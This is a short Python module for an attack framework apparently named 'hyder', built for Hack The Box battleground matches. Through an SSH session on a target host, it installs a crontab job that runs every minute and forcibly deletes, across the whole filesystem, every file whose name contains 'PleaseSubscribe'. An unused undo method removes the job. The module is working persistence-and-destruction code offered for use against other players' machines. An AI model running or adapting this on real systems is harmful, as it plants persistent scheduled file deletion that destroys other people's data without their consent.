import logging
from hyderaddons import ModuleBaseClass

# Credit for crontab handling idea
# https://stackoverflow.com/questions/878600/how-to-create-a-cron-job-using-bash-automatically-without-the-interactive-editor

class TrollIppsec(ModuleBaseClass):

    name = "htbbg_troll_ippsec"
    description = "Simple crontab which removes every file which contains 'PleaseSubscribe' in its name"
    safe = False  # Even though it has undo method, at the time of module creation the method is not used yet hence the module is unsafe

    # Module specific class vars
    croncmd = "find / -name '*PleaseSubscribe*' -exec rm -f {} \\; &>/dev/null"
    cronjob = f"* * * * * {croncmd}"

    def run(self, sshclient, args, server):
        commands_to_check = ["crontab", "find"]
        for command in commands_to_check:
            to_check = f"which {command} || echo notfound"
            _, stdout, _ = sshclient.exec_command(to_check)
            stdout = stdout.read().decode().strip()
            if "notfound" in stdout:
                logging.error(f"{command} binary not found")
                return False

        cmd = f'( crontab -l | grep -v -F "{self.croncmd}" ; echo "{self.cronjob}" ) | crontab -'
        sshclient.exec_command(cmd)

        return True

    # This method is not yet expected by hyder nor implemented to be used anywhere
    # For future usage
    def undo(self, sshclient, args, server):
        cmd = f'( crontab -l | grep -v -F "{self.croncmd}" ) | crontab -'
        sshclient.exec_command(cmd)
        return True
